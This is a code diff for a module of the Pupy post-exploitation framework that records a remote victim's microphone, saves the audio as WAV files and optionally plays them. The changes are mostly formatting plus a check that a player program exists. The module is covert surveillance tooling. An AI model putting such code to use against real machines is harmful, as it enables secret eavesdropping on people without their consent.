@@ -7,12 +7,14 @@ from pupylib.PupyModule import (
     config, PupyModule, PupyArgumentParser
 )
 
-import wave
 import datetime
 import os.path
 import subprocess
+import wave
+
 
 __class_name__="RecordMicrophoneModule"
+
 
 def save_wav(path, sample_width, channels, rate, raw_frames):
     waveFile = wave.open(path, 'wb')
@@ -21,6 +23,7 @@ def save_wav(path, sample_width, channels, rate, raw_frames):
     waveFile.setframerate(rate)
     waveFile.writeframes(raw_frames)
     waveFile.close()
+
 
 @config(cat="gather", compat=["windows"])
 class RecordMicrophoneModule(PupyModule):
@@ -37,18 +40,32 @@ class RecordMicrophoneModule(PupyModule):
 
     def run(self, args):
         try:
-            os.makedirs(os.path.join("data","audio_records"))
+            os.makedirs(os.path.join("data", "audio_records"))
         except Exception:
             pass
-        self.success("starting recording for %ss ..."%args.time)
-        max_length=args.max_length
+
+        self.success("starting recording for %ss ..." % args.time)
+        
+        max_length = args.max_length
         if max_length is None:
-            max_length=args.time
+            max_length = args.time
         if int(max_length) > int(args.time):
             raise PupyModuleError("--max-length argument cannot be bigger than --time")
+        
         for sw, c, r, rf in self.client.conn.modules['mic_recorder'].record_iter(total=args.time, chunk=max_length):
-            filepath=os.path.join("data","audio_records","mic_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".wav")
+            filepath = os.path.join("data","audio_records","mic_" + self.client.short_name() + "_" + str(datetime.datetime.now()).replace(" ","_").replace(":","-") + ".wav")
             save_wav(filepath, sw, c, r, rf)
-            self.success("microphone recording saved to %s"%filepath)
+            self.success("microphone recording saved to %s" % filepath)
+        
         if args.view:
-            subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "sound_player"),filepath])
+            viewer = self.client.pupsrv.config.get("default_viewers", "sound_player")
+                        
+            found = False
+            for p in os.environ.get('PATH', '').split(':'):
+                if os.path.exists(os.path.join(p, viewer)):
+                    subprocess.Popen([viewer,filepath])
+                    found = True
+                    break
+
+            if not found: 
+                self.error('Default viewer not found: %s' % viewer)
